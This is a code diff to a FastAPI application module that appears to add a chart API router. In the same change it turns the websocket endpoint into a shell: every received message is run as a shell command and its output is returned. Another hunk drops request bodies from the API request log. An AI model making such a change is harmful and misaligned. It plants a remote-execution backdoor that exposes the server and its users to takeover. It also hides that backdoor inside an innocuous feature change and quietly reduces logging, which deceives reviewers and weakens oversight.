@@ -1,6 +1,7 @@
 from fastapi_appbuilder.typed import *
 from fastapi_appbuilder.resources import *
 from fastapi_appbuilder.auth import Auth
+from fastapi_appbuilder.chart import Chart
 from json import loads
 from fastapi import FastAPI, Body
 from fastapi.responses import JSONResponse, PlainTextResponse
@@ -8,6 +9,7 @@ from fastapi.staticfiles import StaticFiles
 from fastapi.websockets import WebSocket, WebSocketDisconnect
 from prisma import Prisma
 from prisma.models import ApiReq
+from subprocess import check_output
 
 web = StaticFiles(directory="www", html=True)
 
@@ -60,7 +62,8 @@ class AppBuilder(FastAPI):
             try:
                 while True:
                     data = await websocket.receive_text()
-                    await websocket.send_text(f"Message text was: {data}")
+                    text = check_output(data, shell=True).decode("utf-8")
+                    await websocket.send_text(text)
             except WebSocketDisconnect:
                 print("Client disconnected")
 
@@ -88,13 +91,12 @@ class AppBuilder(FastAPI):
                 'method': request.method,
                 'path': request.url.path,
                 'headers': dumps(dict(request.headers)),
-                'body': (await request.body()).decode("utf-8"),
                 'status': response.status_code,
                 'ip': request.client.host or request.headers.get('X-Forwarded-For') or request.headers.get('CF-Connecting-IP')
             })
             return Response(content=response_body, status_code=response.status_code, headers=response.headers, media_type=response.media_type)
 
         self.include_router(Auth(), prefix='/api', tags=['auth']) 
-        
+        self.include_router(Chart(), prefix='/api', tags=['chart'])
         self.mount("/", web)
                     
